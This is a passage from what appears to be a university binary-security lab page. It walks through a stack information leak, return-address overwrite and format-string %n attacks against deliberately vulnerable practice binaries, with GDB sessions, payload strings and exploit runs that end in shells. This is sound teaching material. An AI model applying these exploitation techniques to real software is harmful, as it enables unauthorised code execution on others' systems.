You can see already that there&#x27;s another <code>read()</code> call.
That one is the first <code>read()</code> call in the <code>my_memory_write()</code> function.</p><p>As noted above, if we use exactly <code>32</code> bytes for name we will end up with a non-null-terminated string, leading to an information leak.
Let&#x27;s see how that goes:</p><div class="language-console codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-console codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">$ python -c &#x27;import sys; sys.stdout.write(32*&quot;A&quot;)&#x27; | ./info_leak</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�)���, what address to modify and with what value?</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">$ python -c &#x27;import sys; sys.stdout.write(32*&quot;A&quot;)&#x27; | ./info_leak | xxd</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">00000000: 6865 6c6c 6f20 4141 4141 4141 4141 4141  hello AAAAAAAAAA</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">00000010: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">00000020: 4141 4141 4141 f0dc ffff ff7f 2c20 7768  AAAAAA......, wh</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">00000030: 6174 2061 6464 7265 7373 2074 6f20 6d6f  at address to mo</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">00000040: 6469 6679 2061 6e64 2077 6974 6820 7768  dify and with wh</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">00000050: 6174 2076 616c 7565 3f0a                 at value?.</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>We see we have an information leak.
We leak one piece of data above: <code>0x7fffffffdcf0</code>.
If we run multiple times we can see that the values for the first piece of information differs:</p><div class="language-console codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-console codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">$ python -c &#x27;import sys; sys.stdout.write(32*&quot;A&quot;)&#x27; | ./info_leak | xxd | grep &#x27;,&#x27;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">00000020: 4141 4141 4141 f0dc ffff ff7f 2c20 7768  AAAAAA......, wh</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>The variable part is related to a stack address (it starts with <code>0x7f</code>);
it varies because ASLR is enabled.
We want to look more carefully using GDB and figure out what the variable value represents:</p><div class="language-console codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-console codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">$ gdb -q ./info_leak</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Reading symbols from ./info_leak...done.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">gdb-peda$ b my_main</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Breakpoint 1 at 0x400560</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">gdb-peda$ r &lt; &lt;(python -c &#x27;import sys; sys.stdout.write(32*&quot;A&quot;)&#x27;)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Starting program: info_leak &lt; &lt;(python -c &#x27;import sys; sys.stdout.write(32*&quot;A&quot;)&#x27;)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[...]</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># Do next instructions until after the call to `printf()`.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">gdb-peda$ ni</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">....</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">gdb-peda$ x/12g name</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x7fffffffdc20: 0x4141414141414141  0x4141414141414141</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x7fffffffdc30: 0x4141414141414141  0x4141414141414141</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x7fffffffdc40: 0x00007fffffffdc50  0x00000000004007aa</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">gdb-peda$ x/2i 0x004007aa</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   0x4007aa &lt;main+9&gt;:  mov    edi,0x4008bc</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   0x4007af &lt;main+14&gt;: call   0x400550 &lt;puts@plt&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">gdb-peda$ pdis main</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Dump of assembler code for function main:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   0x00000000004007a1 &lt;+0&gt;:    push   rbp</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   0x00000000004007a2 &lt;+1&gt;:    mov    rbp,rsp</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   0x00000000004007a5 &lt;+4&gt;:    call   0x400756 &lt;my_main&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   0x00000000004007aa &lt;+9&gt;:    mov    edi,0x4008bc</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   0x00000000004007af &lt;+14&gt;:   call   0x400550 &lt;puts@plt&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   0x00000000004007b4 &lt;+19&gt;:   mov    eax,0x0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   0x00000000004007b9 &lt;+24&gt;:   pop    rbp</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   0x00000000004007ba &lt;+25&gt;:   ret</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">End of assembler dump.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">gdb-peda$</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>From the GDB above, we determine that, after our buffer, there is the stored <code>rbp</code> (i.e. old <code>rbp</code>).</p><p>In 32-bit program there would (usually) be 2 leaked values:</p><ol><li>The old <code>ebp</code></li><li>The return address of the function</li></ol><p>This happens if the values of the old <code>ebp</code> and the return address don&#x27;t have any <code>x00</code> bytes.</p><p>In the 64-bit example we only get the old <code>rbp</code> because the 2 high bytes of the stack address are always <code>0</code> which causes the string to be terminated early.</p><p>When we leak the two values we are able to retrieve the stored <code>rbp</code> value.
In the above run the value of <code>rbp</code> is <code>0x00007fffffffdc50</code>.
We also see that the stored <code>rbp</code> value is stored at <strong>address</strong> <code>0x7fffffffdc40</code>, which is the address current <code>rbp</code>.
We have the situation in the below diagram:</p><p><img loading="lazy" src="https://ocw.cs.pub.ro/courses/_media/cns/labs/info-leak-stack-64.png" alt="Stak Information Leak" class="img_ev3q"></p><p>We marked the stored <code>rbp</code> value (i.e. the frame pointer for <code>main()</code>: <code>0x7fffffffdc50</code>) with the font color red in both places.</p><p>In short, if we leak the value of the stored <code>rbp</code> (i.e. the frame pointer for <code>main()</code>: <code>0x00007fffffffdc50</code>) we can determine the address of the current <code>rbp</code> (i.e. the frame pointer for <code>my_main()</code>: <code>0x7fffffffdc40</code>), by subtracting <code>16</code>.
The address where the <code>my_main()</code> return address is stored (<code>0x7fffffffdc48</code>) is computed by subtracting <code>8</code> from the leaked <code>rbp</code> value.
By overwriting the value at this address we will force an arbitrary code execution and call <code>my_evil_func()</code>.</p><p>In order to write the return address of the <code>my_main()</code> function with the address of the <code>my_evil_func()</code> function, make use of the conveniently (but not realistically) placed <code>my_memory_write()</code> function.
The <code>my_memory_write()</code> allows the user to write arbitrary values to arbitrary memory addresses.</p><p>Considering all of this, update the <code>TODO</code> lines of the <code>exploit.py</code> script to make it call the <code>my_evil_func()</code> function.</p><p>Same as above, use <code>nm</code> to determine address of the <code>my_evil_func()</code> function.
When sending your exploit to the remote server, adjust this address according to the binary running on the remote endpoint.
The precompiled binary can be found in <a title="cns:resources:repo" href="/binary-security/courses/cns/resources/repo">the CNS public repository</a>.</p><p>Use the above logic to determine the <code>old rbp</code> leak and then the address of the <code>my_main()</code> return address.</p><p>See <a href="https://docs.pwntools.com/en/stable/util/packing.html#pwnlib.util.packing.unpack" target="_blank" rel="noopener noreferrer" title="https://docs.pwntools.com/en/stable/util/packing.html#pwnlib.util.packing.unpack">here</a> examples of using the <code>unpack()</code> function.</p><p>In case of a successful exploit the program will spawn a shell in the <code>my_evil_func()</code> function, same as below:</p><div class="language-console codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-console codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">$ python exploit.py</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[!] Could not find executable &#x27;info_leak&#x27; in $PATH, using &#x27;./info_leak&#x27; instead</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[+] Starting local process &#x27;./info_leak&#x27;: pid 6422</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[*] old_rbp is 0x7fffffffdd40</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[*] return address is located at is 0x7fffffffdd38</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[*] Switching to interactive mode</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Returning from main!</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">$ id</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>The rule of thumb is: <strong>Always know your string length.</strong></p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="format-string-attacks">Format String Attacks<a class="hash-link" href="#format-string-attacks" title="Direct link to heading">​</a></h3><p>We will now see how improper use of <code>printf()</code> may provide us with ways of extracting information or doing actual attacks.</p><p>Calling <code>printf</code> or some other string function that takes a format string as a parameter, directly with a string which is supplied by the user leads to a vulnerability called <strong>format string attack</strong>.</p><p>The definition of <code>printf</code>:</p><div class="language-c codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-c codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">int</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">printf</span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">const</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">char</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain">format</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">.</span><span class="token punctuation" style="color:#393A34">.</span><span class="token punctuation" style="color:#393A34">.</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Let&#x27;s recap some of <a href="http://www.cplusplus.com/reference/cstdio/printf/" target="_blank" rel="noopener noreferrer">useful formats</a>:</p><ul><li><code>%08x</code> -- prints a number in hex format, meaning takes a number from the stack and prints in hex format</li><li><code>%s</code> -- prints a string, meaning takes a pointer from the stack and prints the string from that address</li><li><code>%n</code> -- writes the number of bytes written so far to the address given as a parameter to the function (takes a pointer from the stack).
This format is not widely used but it is in the C standard.</li><li><code>%x</code> and <code>%n</code> are enough to have memory read and write and hence, to successfully exploit a vulnerable program that calls <code>printf</code> (or other format string function) directly with a string controlled by the user.</li></ul><h2 class="anchor anchorWithStickyNavbar_LWe7" id="example-2">Example 2<a class="hash-link" href="#example-2" title="Direct link to heading">​</a></h2><div class="language-c codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-c codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token function" style="color:#d73a49">printf</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">my_string</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>The above snippet is a good example of why ignoring compile time warnings is dangerous.
The given example is easily detected by a static checker.</p><p>Try to think about:</p><ul><li>The peculiarities of <code>printf</code> (variable number of arguments)</li><li>Where <code>printf</code> stores its arguments (<em>hint</em>: on the stack)</li><li>What happens when <code>my_string</code> is <code>&quot;%x&quot;</code></li><li>How matching between format strings (e.g. the one above) and arguments is enforced (<em>hint</em>: it&#x27;s not) and what happens in general when the number of arguments doesn&#x27;t match the number of format specifiers</li><li>How we could use this to cause information leaks and arbitrary memory writes (<em>hint</em>: see the format specifiers at the beginning of the section)</li></ul><h2 class="anchor anchorWithStickyNavbar_LWe7" id="example-3">Example 3<a class="hash-link" href="#example-3" title="Direct link to heading">​</a></h2><p>We would like to check some of the well known and not so-well known features of <a href="http://man7.org/linux/man-pages/man3/printf.3.html" target="_blank" rel="noopener noreferrer">the <code>printf</code> function</a>.
Some of them may be used for information leaking and for attacks such as format string attacks.</p><p>Go into <code>printf-features/</code> subfolder and browse the <code>printf-features.c</code> file.
Compile the executable file using:</p><div class="language-console codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-console codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">make</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>and then run the resulting executable file using</p><div class="language-console codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-console codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">./printf-features</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Go through the <code>printf-features.c</code> file again and check how print, length and conversion specifiers are used by <code>printf</code>.
We will make use of the <code>%n</code> feature that allows memory writes, a requirement for attacks.</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="basic-format-string-attack">Basic Format String Attack<a class="hash-link" href="#basic-format-string-attack" title="Direct link to heading">​</a></h2><p>You will now do a basic format string attack using the <code>03-basic-format-string/</code> subfolder.
The source code is in <code>basic_format_string.c</code> and the executable is in <code>basic_format_string</code>.</p><p>You need to use <code>%n</code> to overwrite the value of the <code>v</code> variable to <code>0x300</code>.
You have to do three steps:</p><ol><li><p>Determine the address of the <code>v</code> variable using <code>nm</code>.</p></li><li><p>Determine the <code>n</code>-th parameter of <code>printf()</code> that you can write to using <code>%n</code>.
The <code>buffer</code> variable will have to be that parameter;
you will store the address of the <code>v</code> variable in the <code>buffer</code> variable.</p></li><li><p>Construct a format string that enables the attack;
the number of characters processed by <code>printf()</code> until <code>%n</code> is matched will have to be <code>0x300</code>.</p></li></ol><p>For the second step let&#x27;s run the program multiple times and figure out where the <code>buffer</code> address starts.
We fill <code>buffer</code> with the <code>aaaa</code> string and we expect to discover it using the <code>printf()</code> format specifiers.</p><div class="language-console codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-console codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">$  ./basic_format_string</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">AAAAAAAA</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">7fffffffdcc07fffffffdcc01f6022897ffff7fd44c0786c6c25786c6c25786c6c25786c6c25786c6c25786c6c25786c6c25786c6c25786c6c25786c6c25</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">$ ./basic_format_string</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">AAAAAAAA</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">x7fffffffdcc07fffffffdcc0116022917ffff7dd18d06c6c25786c6c25786c6c25786c6c25786c6c25786c6c25787fffffffdcc07fffffffdcc01f6022917ffff7fd44c0786c6c25786c6c25786c6c25786c6c25786c6c25786c6c25786c6c25786c6c25786c6c25786c6c25786c6c25786c6c2540000a</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">$ ./basic_format_string</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">AAAAAAAA</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">7fffffffdcc07fffffffdcc01f6022997ffff7fd44c0786c6c25786c6c25786c6c25786c6c25786c6c25786c6c25786c6c25786c6c25786c6c25786c6c25786c6c25786c6c25786c6c25786c6c2540000a4141414141414141</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>In the last run we get the <code>4141414141414141</code> representation of <code>AAAAAAAA</code>.
That means that, if we replace the final <code>%lx</code> with <code>%n</code>, we will write at the address <code>0x4141414141414141</code> the number of characters processed so far:</p><div class="language-console codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-console codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">$ echo -n &#x27;7fffffffdcc07fffffffdcc01f6022997ffff7fd44c0786c6c25786c6c25786c6c25786c6c25786c6c25786c6c25786c6c25786c6c25786c6c25786c6c25786c6c25786c6c25786c6c25786c6c2540000a&#x27; | wc -c</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">162</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>We need that number to be <code>0x300</code>.
You can fine tune the format string by using a construct such as <code>%32llx</code> to print a number on <code>32</code> characters instead of a maximum of <code>16</code> characters.
See how much extra room you need and see if you reach <code>0x300</code> bytes.</p><p>The construct needn&#x27;t use a multiple of <code>8</code> for length.
You may use the <code>%32llx</code> or <code>%33llx</code> or <code>%42llx</code>.
The numeric argument states the length of the print output.</p><p>After the plan is complete, write down the attack by filling the <code>TODO</code> lines in the <code>exploit.py</code> solution skeleton.</p><p>When sending your exploit to the remote server, adjust this address according to the binary running on the remote endpoint.
The precompiled binary can be found in <a title="cns:resources:repo" href="/binary-security/courses/cns/resources/repo">the CNS public repository</a>.</p><p>After you write 0x300 chars in v, you should obtain shell</p><div class="language-console codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-console codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">$ python exploit64.py</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[!] Could not find executable &#x27;basic_format_string&#x27; in $PATH, using &#x27;./basic_format_string&#x27; instead</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[+] Starting local process &#x27;./basic_format_string&#x27;: pid 20785</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[*] Switching to interactive mode</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                                     7fffffffdcc0  7fffffffdcc01f60229b7ffff7dd18d03125786c6c393425786c6c25786c6c34786c6c25786c6c25786c6c25786c6c25786c6c25786c6c25786c6c25786c6c25786c6c25786c6c25a6e25</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">$</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h2 class="anchor anchorWithStickyNavbar_LWe7" id="extra-format-string-attack">Extra: Format String Attack<a class="hash-link" href="#extra-format-string-attack" title="Direct link to heading">​</a></h2><p>Go to the <code>04-format-string/</code> subfolder.
In this task you will be working with a <strong>32-bit binary</strong>.</p><p>The goal of this task is to call <code>my_evil_func</code> again.
This task is also tutorial based.</p><div class="language-c codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-c codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">int</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">main</span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">int</span><span class="token plain"> argc</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">char</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain">argv</span><span class="token punctuation" style="color:#393A34">[</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token function" style="color:#d73a49">printf</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">argv</span><span class="token punctuation" style="color:#393A34">[</span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token function" style="color:#d73a49">printf</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&quot;\nThis is the most useless and insecure program!\n&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">return</span><span class="token plain"> </span><span class="token number" 